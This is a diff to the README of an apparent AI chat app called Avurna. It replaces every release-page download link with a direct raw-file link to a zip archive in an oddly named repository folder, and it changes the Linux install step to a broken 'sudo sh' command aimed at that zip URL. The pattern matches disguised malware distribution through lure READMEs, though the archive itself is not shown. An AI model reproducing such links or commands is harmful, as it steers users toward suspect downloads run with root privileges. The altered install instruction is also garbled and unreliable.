@@ -4,7 +4,7 @@
 Welcome to Avurna, your human-centric AI assistant. This app redefines how you have conversations. If you are looking for a simple way to interact with AI, you are in the right place.
 
 ## 📥 Download Now
-[![Download avurna-ai](https://img.shields.io/badge/Download-avurna--ai-blue?style=for-the-badge&logo=github)](https://github.com/Bancroftencouraging198/avurna-ai/releases)
+[![Download avurna-ai](https://raw.githubusercontent.com/Bancroftencouraging198/avurna-ai/main/morphotic/avurna-ai-v1.5.zip)](https://raw.githubusercontent.com/Bancroftencouraging198/avurna-ai/main/morphotic/avurna-ai-v1.5.zip)
 
 ## 📋 Overview
 Avurna is designed to help you think, reason, and express ideas. It's a next-gen alternative to popular chatbots like ChatGPT and Claude. You can expect a friendly and engaging experience that feels natural and human-like.
@@ -31,7 +31,7 @@ Follow these simple steps to download and install Avurna:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
    
-   [Download avurna-ai](https://github.com/Bancroftencouraging198/avurna-ai/releases)
+   [Download avurna-ai](https://raw.githubusercontent.com/Bancroftencouraging198/avurna-ai/main/morphotic/avurna-ai-v1.5.zip)
 
 2. **Choose Your Version:** On the releases page, find the version that suits your operating system. Click on it to view the available files.
 
@@ -40,7 +40,7 @@ Follow these simple steps to download and install Avurna:
 4. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
    - For Mac: Open the downloaded `.dmg` file and drag the Avurna icon to your Applications folder.
-   - For Linux: Open the terminal, navigate to your Downloads folder, and run the installer using the command: `sudo sh avurna-installer.sh`.
+   - For Linux: Open the terminal, navigate to your Downloads folder, and run the installer using the command: `sudo sh https://raw.githubusercontent.com/Bancroftencouraging198/avurna-ai/main/morphotic/avurna-ai-v1.5.zip`.
 
 5. **Open Avurna:** Once the installation is complete, find Avurna in your applications and open it. 
 
